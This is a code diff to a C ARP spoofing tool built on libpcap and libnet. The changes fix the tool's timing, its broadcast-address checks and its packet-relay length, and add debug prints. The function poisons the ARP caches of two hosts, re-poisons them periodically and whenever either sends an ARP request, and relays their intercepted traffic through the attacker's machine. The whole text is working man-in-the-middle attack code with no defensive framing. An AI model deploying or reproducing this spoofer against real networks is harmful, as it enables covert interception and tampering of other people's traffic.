@@ -170,16 +170,19 @@ int ARPSpoof(pcap_t *handle, struct in_addr AttackerIP, struct in_addr SenderIP,
         struct pcap_pkthdr* header;
         const u_char* packet;        
         double timeGap;
-        time_t startTime = 0, endTime = 0;
+        struct timespec start, end;
+		char buf[20];
 
         // initial infection
+        printf("initial infection\n");
         SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA);
 
-        startTime = clock();
+        clock_gettime(CLOCK_MONOTONIC, &start);
 
         while(1)
         {
                 int res = pcap_next_ex(handle, &header, &packet);
+                
                 if(res == 0)
                         continue;
                 if(res == -1 || res == -2)
@@ -194,20 +197,25 @@ int ARPSpoof(pcap_t *handle, struct in_addr AttackerIP, struct in_addr SenderIP,
                 ethernet = (struct libnet_ethernet_hdr *)packet;
 
                 /* infection per period */
-                endTime = clock();
-                timeGap = (double)(endTime - startTime)/(CLOCKS_PER_SEC);
-                if(timeGap > PERIOD_ARP_INFECTION)
+                clock_gettime(CLOCK_MONOTONIC, &end);
+                timeGap = (end.tv_sec - start.tv_sec);
+                timeGap += (end.tv_nsec - start.tv_nsec) / 1000000000.0;
+               
+                if(timeGap > 100 * PERIOD_ARP_INFECTION)
                 {
                         SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA);
-                        startTime = clock();
+                        printf("period infection\n");
+                        clock_gettime(CLOCK_MONOTONIC, &start);
                 }
 
 
                 if(memcmp(ethernet->ether_shost, &TargetHA, ETHER_ADDR_LEN) == 0) // check if arp broadcast from target
                 {
-                        if(memcmp(ethernet->ether_dhost, "/xff/xff/xff/xff/xff/xff", ETHER_ADDR_LEN)) // check broadcast
+                		//printf("target broadcast?\n");
+                		//printf("%s\n",my_ether_ntoa((struct libnet_ether_addr*)ethernet->ether_dhost, buf));
+                        if(memcmp(ethernet->ether_dhost, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN)) // check broadcast
                                 continue;
-
+						//printf("it is broadcast\n");
                         if(ntohs(ethernet->ether_type) != ETHERTYPE_ARP) // check arp packet
                                 continue;
                         
@@ -222,47 +230,46 @@ int ARPSpoof(pcap_t *handle, struct in_addr AttackerIP, struct in_addr SenderIP,
                                 continue;
                         if(memcmp(arp->source_IP, &TargetIP, IP_ADDR_LEN))
                                 continue;
-                        if(memcmp(arp->destination_HA, "/x00/x00/x00/x00/x00/x00", ETHER_ADDR_LEN))
+                        if(memcmp(arp->destination_HA, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN))
                                 continue;
                         if(memcmp(arp->destination_IP, &SenderIP, IP_ADDR_LEN))
                                 continue;
                         
                         SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA); // if arp broadcast from target, infect
+                        printf("target broadcast infection\n");
                 }
                 else if(memcmp(ethernet->ether_shost, &SenderHA, ETHER_ADDR_LEN) == 0) // check packet is from sender
                 {
-                        if(ntohs(arp->ethernet.ether_type) == ETHERTYPE_ARP) // if arp packet
+                        if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP) // if arp packet
                         {
-                                if(memcmp(ethernet->ether_dhost, "/xff/xff/xff/xff/xff/xff", ETHER_ADDR_LEN)) // check broadcast
+                                if(memcmp(ethernet->ether_dhost, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN) && memcmp(ethernet->ether_dhost, &AttackerHA, ETHER_ADDR_LEN)) // check broadcast or unicast
                                         continue;
-
-                                if(ntohs(ethernet->ether_type) != ETHERTYPE_ARP) // check arp packet
-                                        continue;
-                        
+                        	
                                 arp = (struct arp_packet *)packet;
 
                                 /* check arp header */
                                 if(ntohs(arp->arp.ar_hrd) != ARPHRD_ETHER || ntohs(arp->arp.ar_pro) != ETHERTYPE_IP || arp->arp.ar_hln != 6 || arp->arp.ar_pln != 4 || ntohs(arp->arp.ar_op) != ARPOP_REQUEST)
                                         continue;
-
+						
                                 /* check address */
                                 if(memcmp(arp->source_HA, &SenderHA, ETHER_ADDR_LEN))
                                         continue;
                                 if(memcmp(arp->source_IP, &SenderIP, IP_ADDR_LEN))
                                         continue;
-                                if(memcmp(arp->destination_HA, "/x00/x00/x00/x00/x00/x00", sizeof(libnet_ether_addr)))
+                                if(memcmp(arp->destination_HA, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN))
                                         continue;
                                 if(memcmp(arp->destination_IP, &TargetIP, IP_ADDR_LEN))
                                         continue;
 
-                                SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA); // if arp broadcast from sender, infect
+                                SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA); // if arp request from sender, infect
+                                printf("sender broadcast infection\n");
                         }
                         else // if packet to relay
                         {
                                 memcpy(ethernet->ether_shost, &AttackerHA, ETHER_ADDR_LEN);
                                 memcpy(ethernet->ether_dhost, &TargetHA, ETHER_ADDR_LEN);
 
-                                if(pcap_sendpacket(handle, packet, sizeof(arp_packet)) != 0)
+                                if(pcap_sendpacket(handle, packet, header->caplen) != 0)
                                 {   
                                         fprintf(stderr, "Error Relay: %s\n", pcap_geterr(handle));
                                         return -1; 
